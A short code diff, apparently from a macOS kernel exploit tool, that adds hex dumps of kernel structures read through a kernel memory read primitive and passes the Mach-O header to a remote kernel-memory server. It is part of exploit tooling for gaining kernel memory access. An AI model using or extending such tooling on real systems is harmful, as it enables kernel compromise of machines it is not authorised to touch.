@@ -36,6 +36,8 @@
 #include "kmem/allocator_rw.h"
 #include "kmem/zkext_prime_util.h"
 
+#include "util_binary.h"
+
 
 #define NUM_SMB_SERVER_PORTS 64
 #define SMB_PORT_FOR_INDEX(base_addr, index, count) (ntohs((base_addr)->sin_port) + (index / ((count + NUM_SMB_SERVER_PORTS - 1) / NUM_SMB_SERVER_PORTS)))
@@ -378,8 +380,14 @@ int main(void) {
     char backup_worker[368];
     xe_kmem_read(backup_worker, msdosfs_worker, sizeof(backup_worker));
     
+    printf("msdosfsmount worker: \n");
+    xe_util_binary_hex_dump(backup_worker, sizeof(backup_worker));
+    
     char backup_helper[368];
     xe_kmem_read(backup_helper, msdosfs_helper, sizeof(backup_helper));
+    
+    printf("msdosfsmount helper: \n");
+    xe_util_binary_hex_dump(backup_helper, sizeof(backup_helper));
     
     char temp_dir[PATH_MAX] = "/tmp/xe_kmem_XXXXXXX";
     xe_assert(mkdtemp(temp_dir) != NULL);
@@ -451,7 +459,9 @@ int main(void) {
     kmem_zkext_free_session_destroy(&zkext_free_session);
     kmem_allocator_prpw_destroy(&allocated_entry.element_allocator);
     
-    xe_kmem_remote_server_start();
+    struct xe_kmem_remote_server_ctx server_ctx;
+    server_ctx.mh_execute_header = mh_execute_header;
+    xe_kmem_remote_server_start(&server_ctx);
     
     return 0;
 }
